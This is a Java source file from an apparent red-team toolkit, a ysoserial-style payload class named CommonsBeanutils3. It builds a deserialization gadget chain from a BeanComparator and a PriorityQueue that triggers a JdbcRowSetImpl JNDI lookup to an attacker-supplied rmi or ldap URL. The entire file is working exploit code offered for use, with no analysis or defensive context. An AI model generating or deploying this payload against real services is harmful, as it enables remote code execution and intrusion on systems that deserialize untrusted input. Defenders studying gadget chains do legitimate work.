package com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads;

import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.JavassistClassLoader;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.annotation.Authors;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.annotation.Dependencies;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.annotation.PayloadTest;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.custom.CustomCommand;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.util.PayloadRunner;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.util.Reflections;
import com.sun.rowset.JdbcRowSetImpl;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtField;
import org.apache.commons.beanutils.BeanComparator;

import java.math.BigInteger;
import java.util.Comparator;
import java.util.PriorityQueue;

@PayloadTest(precondition = "isApplicableJavaVersion")
@Dependencies({
        "commons-beanutils:commons-beanutils:1.9.2",
        "commons-collections:commons-collections:3.1",
        "commons-logging:commons-logging:1.2"
})
@Authors({Authors.BEIYING})
@SuppressWarnings({"rawtypes", "unchecked", "restriction"})
public class CommonsBeanutils3 implements ObjectPayload<Object> {

    @Override
    public Object getObject(String command) throws Exception {
        String value = command == null ? "" : command.trim();
        if (!value.toLowerCase().startsWith(CustomCommand.COMMAND_JNDI)) {
            throw new Exception("Command format is: [rmi|ldap]://host:port/obj");
        }
        String jndiUrl = value.substring(CustomCommand.COMMAND_JNDI.length());

        Comparator comparator = createCompatibleBeanComparator();
        Reflections.setFieldValue(comparator, "property", "lowestSetBit");

        JdbcRowSetImpl rowSet = new JdbcRowSetImpl();
        rowSet.setDataSourceName(jndiUrl);
        rowSet.setMatchColumn("foo");

        PriorityQueue queue = new PriorityQueue(2, comparator);
        queue.add(new BigInteger("1"));
        queue.add(new BigInteger("1"));

        Reflections.setFieldValue(comparator, "property", "databaseMetaData");
        Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
        queueArray[0] = rowSet;
        queueArray[1] = rowSet;
        return queue;
    }

    private static Comparator createCompatibleBeanComparator() throws Exception {
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(Class.forName("org.apache.commons.beanutils.BeanComparator")));
        CtClass beanComparator = pool.get("org.apache.commons.beanutils.BeanComparator");
        try {
            beanComparator.defrost();
            try {
                CtField field = beanComparator.getDeclaredField("serialVersionUID");
                beanComparator.removeField(field);
            } catch (javassist.NotFoundException ignored) {
            }
            beanComparator.addField(CtField.make(
                    "private static final long serialVersionUID = -3490850999041592962L;",
                    beanComparator
            ));
            return (Comparator) beanComparator.toClass(new JavassistClassLoader()).newInstance();
        } finally {
            beanComparator.defrost();
        }
    }

    public static void main(String[] args) throws Exception {
        PayloadRunner.run(CommonsBeanutils3.class, args);
    }
}
